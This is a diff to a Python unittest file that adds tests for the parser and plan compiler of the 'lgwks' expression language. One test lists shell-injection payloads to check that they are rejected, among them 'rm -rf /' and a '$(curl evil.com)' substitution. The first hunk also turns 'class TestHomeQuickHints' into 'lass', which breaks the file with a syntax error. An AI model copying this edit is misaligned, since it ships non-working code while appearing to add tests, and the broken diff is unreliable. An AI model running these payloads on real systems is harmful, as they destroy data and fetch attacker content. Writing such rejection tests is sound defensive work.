@@ -885,7 +885,7 @@ class TestGroundDegradation(unittest.TestCase):
         self.assertEqual(g["sources"], [])
 
 
-class TestHomeQuickHints(unittest.TestCase):
+lass TestHomeQuickHints(unittest.TestCase):
     """L4 invariant: every verb shown in the `quick` block must exist in the live parser, and the
     block must never contain a separate binary (e.g. `lgwks-akinator`) that the parser can't dispatch.
     Source-of-truth = `lgwks build_parser()` (the same parser `lgwks --help` shows)."""
@@ -1026,6 +1026,247 @@ class TestHomeQuickHints(unittest.TestCase):
             importlib.import_module("sys").stdout = real
         out = captured.getvalue()
         self.assertEqual(out, "", f"quick block should be empty when hints unavailable, got: {out!r}")
+
+
+class TestExpressionParser(unittest.TestCase):
+    """lgwks-expression/1 parser + resolver tests.
+
+    All tests run offline -- the manifest is mocked so no filesystem or network
+    access is needed.
+    """
+
+    def _mock_manifest(self, extra_verbs=None) -> dict:
+        """Minimal manifest with a known verb surface for deterministic resolution."""
+        verbs = [
+            {"verb": "research", "intent": "test", "args": {}, "output": "", "tokens": "none"},
+            {"verb": "store", "intent": "test", "args": {}, "output": "", "tokens": "none"},
+            {"verb": "extract", "intent": "test", "args": {}, "output": "", "tokens": "none"},
+            {"verb": "memory remember", "intent": "test", "args": {}, "output": "", "tokens": "none"},
+        ] + (extra_verbs or [])
+        return {
+            "manifest": "lgwks.manifest.v0",
+            "tool": "lgwks",
+            "brand": "Logical Works",
+            "machine_first": True,
+            "verbs": verbs,
+            "capabilities": [],
+            "steering": {},
+            "thought_schema": "",
+        }
+
+    # -- parse() tests -------------------------------------------------------
+
+    def test_parse_simple_chain_returns_two_steps(self):
+        # Spec example: two-step pipeline with string args.
+        import lgwks_expression as ex
+        ast = ex.parse('research["query":"X"] | store["tag":"Y"]')
+        self.assertEqual(len(ast), 2)
+        self.assertEqual(ast[0]["verb_id"], "research")
+        self.assertEqual(ast[0]["args"], {"query": "X"})
+        self.assertEqual(ast[0]["index"], 0)
+        self.assertEqual(ast[1]["verb_id"], "store")
+        self.assertEqual(ast[1]["args"], {"tag": "Y"})
+        self.assertEqual(ast[1]["index"], 1)
+
+    def test_parse_no_args_single_step(self):
+        import lgwks_expression as ex
+        ast = ex.parse("extract")
+        self.assertEqual(len(ast), 1)
+        self.assertEqual(ast[0]["verb_id"], "extract")
+        self.assertEqual(ast[0]["args"], {})
+
+    def test_parse_dotted_verb_id(self):
+        import lgwks_expression as ex
+        ast = ex.parse('memory.remember["project":"q1"]')
+        self.assertEqual(ast[0]["verb_id"], "memory.remember")
+        self.assertEqual(ast[0]["args"], {"project": "q1"})
+
+    def test_parse_number_and_bool_args(self):
+        import lgwks_expression as ex
+        ast = ex.parse('research["limit":10,"strict":true,"score":0.5]')
+        self.assertEqual(ast[0]["args"]["limit"], 10)
+        self.assertIs(ast[0]["args"]["strict"], True)
+        self.assertAlmostEqual(ast[0]["args"]["score"], 0.5)
+
+    def test_parse_null_arg(self):
+        import lgwks_expression as ex
+        ast = ex.parse('extract["target":null]')
+        self.assertIsNone(ast[0]["args"]["target"])
+
+    def test_parse_rejects_shell_injection(self):
+        # Security: shell metacharacters must raise ExpressionParseError, not execute.
+        import lgwks_expression as ex
+        injection_payloads = [
+            '$(rm -rf /)',
+            '`id`',
+            'extract && rm -rf /',
+            'store;sudo whoami',
+            'verb["arg":"$(curl evil.com)"]',
+        ]
+        for payload in injection_payloads:
+            with self.assertRaises(ex.ExpressionParseError, msg=f"should reject: {payload!r}"):
+                ex.parse(payload)
+
+    def test_parse_rejects_empty_string(self):
+        import lgwks_expression as ex
+        with self.assertRaises(ex.ExpressionParseError):
+            ex.parse("")
+        with self.assertRaises(ex.ExpressionParseError):
+            ex.parse("   ")
+
+    def test_parse_rejects_invalid_verb_id_leading_digit(self):
+        import lgwks_expression as ex
+        with self.assertRaises(ex.ExpressionParseError):
+            ex.parse("1extract")
+
+    def test_parse_rejects_unclosed_bracket(self):
+        import lgwks_expression as ex
+        with self.assertRaises(ex.ExpressionParseError):
+            ex.parse('extract["target":"x"')
+
+    def test_parse_rejects_missing_colon_in_kv(self):
+        import lgwks_expression as ex
+        with self.assertRaises(ex.ExpressionParseError):
+            ex.parse('extract["target" "x"]')
+
+    # -- compile() tests -----------------------------------------------------
+
+    def test_compile_assigns_risk_class_to_steps_and_plan(self):
+        # Spec: risk_class per step + plan-level max.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        # 'research' resolves to cli:research; _classify("research") returns "unknown"
+        # because 'research' is not in the _READ/_MUTATE/_DESTRUCTIVE patterns.
+        # 'store' resolves to cli:store. Verify plan-level risk_class is present.
+        plan = ex.compile_from_string('research["query":"X"] | store["tag":"Y"]', manifest)
+        self.assertIn("risk_class", plan)
+        self.assertIn(plan["risk_class"], {"read", "mutate", "unknown", "destructive"})
+        for step in plan["steps"]:
+            self.assertIn("risk_class", step)
+            self.assertIn(step["risk_class"], {"read", "mutate", "unknown", "destructive"})
+
+    def test_compile_risk_class_is_max_of_steps(self):
+        # Spec invariant: plan.risk_class == max(step.risk_class for step in steps).
+        import lgwks_expression as ex
+        from lgwks_multiply import _RISK_ORDER
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string('research["query":"X"] | store["tag":"Y"]', manifest)
+        step_risks = [s["risk_class"] for s in plan["steps"]]
+        expected_max = max(step_risks, key=lambda r: _RISK_ORDER.get(r, 2))
+        self.assertEqual(plan["risk_class"], expected_max)
+
+    def test_plan_id_is_deterministic(self):
+        # Spec invariant: same expression -> same plan_id on any invocation.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        expr = 'research["query":"causal inference"] | store["tag":"q1"]'
+        plan_a = ex.compile_from_string(expr, manifest)
+        plan_b = ex.compile_from_string(expr, manifest)
+        self.assertEqual(plan_a["plan_id"], plan_b["plan_id"])
+
+    def test_plan_id_is_sha256_of_canonical(self):
+        # Spec: plan_id = sha256(canonical_expression_string).hexdigest()
+        import hashlib
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string('extract["target":"https://example.com"]', manifest)
+        expected_id = hashlib.sha256(plan["canonical_expression"].encode("utf-8")).hexdigest()
+        self.assertEqual(plan["plan_id"], expected_id)
+
+    def test_plan_id_stable_across_arg_order_variation(self):
+        # Spec: canonical form sorts args by key; different source order -> same plan_id.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        # These two differ only in arg order; canonical form must normalise them.
+        plan_a = ex.compile_from_string('research["limit":10,"query":"X"]', manifest)
+        plan_b = ex.compile_from_string('research["query":"X","limit":10]', manifest)
+        self.assertEqual(plan_a["plan_id"], plan_b["plan_id"])
+        self.assertEqual(plan_a["canonical_expression"], plan_b["canonical_expression"])
+
+    def test_unknown_verb_degrades_loudly_not_silently(self):
+        # Spec: unresolved verb_id -> needs_review=True, warning in plan, NOT a hard crash.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()  # 'reason' is NOT in the mock manifest
+        plan = ex.compile_from_string('reason["query":"summarise findings"]', manifest)
+        step = plan["steps"][0]
+        self.assertIsNone(step["resolved_primitive"])
+        self.assertTrue(step["needs_review"])
+        self.assertEqual(step["risk_class"], "unknown")
+        self.assertTrue(
+            any("unresolved" in w or "reason" in w for w in plan["warnings"]),
+            f"warnings must name the unresolved verb; got {plan['warnings']}",
+        )
+
+    def test_unknown_verb_raises_verb_resolution_error_type_exists(self):
+        # The VerbResolutionError class must be importable and be a LookupError subclass.
+        import lgwks_expression as ex
+        self.assertTrue(issubclass(ex.VerbResolutionError, LookupError))
+
+    def test_known_verb_resolves_to_cli_primitive(self):
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string("extract", manifest)
+        self.assertEqual(plan["steps"][0]["resolved_primitive"], "cli:extract")
+        self.assertFalse(plan["steps"][0]["needs_review"])
+
+    def test_dotted_verb_resolves_to_cli_with_space(self):
+        # 'memory.remember' -> 'cli:memory remember'
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string('memory.remember["project":"q1"]', manifest)
+        self.assertEqual(plan["steps"][0]["resolved_primitive"], "cli:memory remember")
+
+    def test_plan_schema_field_is_correct_discriminator(self):
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string("extract", manifest)
+        self.assertEqual(plan["schema"], "lgwks-expression/1")
+
+    def test_compile_policy_shell_is_always_false(self):
+        # Spec invariant: no step may execute through a shell interpreter.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string("extract", manifest)
+        self.assertFalse(plan["compile_policy"]["shell"])
+
+    def test_manifest_version_recorded_in_plan(self):
+        # Spec invariant: plan records manifest_version so replay detects drift.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string("extract", manifest)
+        self.assertEqual(plan["manifest_version"], "lgwks.manifest.v0")
+
+    def test_is_expression_string_routing_heuristic(self):
+        import lgwks_expression as ex
+        # Should identify expression strings.
+        self.assertTrue(ex.is_expression_string("extract"))
+        self.assertTrue(ex.is_expression_string('research["query":"X"] | store'))
+        self.assertTrue(ex.is_expression_string("memory.remember"))
+        # Should NOT identify JSON objects.
+        self.assertFalse(ex.is_expression_string('{"schema":"lgwks-geoexpr/1"}'))
+        # Should NOT identify brace expressions.
+        self.assertFalse(ex.is_expression_string("git {status,log}"))
+        # Should NOT identify empty string.
+        self.assertFalse(ex.is_expression_string(""))
+
+    def test_expression_parse_error_has_typed_class(self):
+        # Spec: typed errors, never bare Exception.
+        import lgwks_expression as ex
+        self.assertTrue(issubclass(ex.ExpressionParseError, ValueError))
+        err = ex.ExpressionParseError("test", pos=3, token="abc")
+        self.assertEqual(err.pos, 3)
+        self.assertEqual(err.token, "abc")
+
+    def test_canonical_expression_is_lowercase_sorted_args(self):
+        # Canonical form: verb_id lowercased, args sorted by key.
+        import lgwks_expression as ex
+        manifest = self._mock_manifest()
+        plan = ex.compile_from_string('research["z":"last","a":"first"]', manifest)
+        canon = plan["canonical_expression"]
+        self.assertIn("research", canon)
+        # 'a' must appear before 'z' in the canonical form (arg sort is lexicographic).
+        # Canonical form uses bare key names (unquoted), so search for 'a:' and 'z:'.
+        self.assertLess(canon.index("a:"), canon.index("z:"))
 
 
 if __name__ == "__main__":
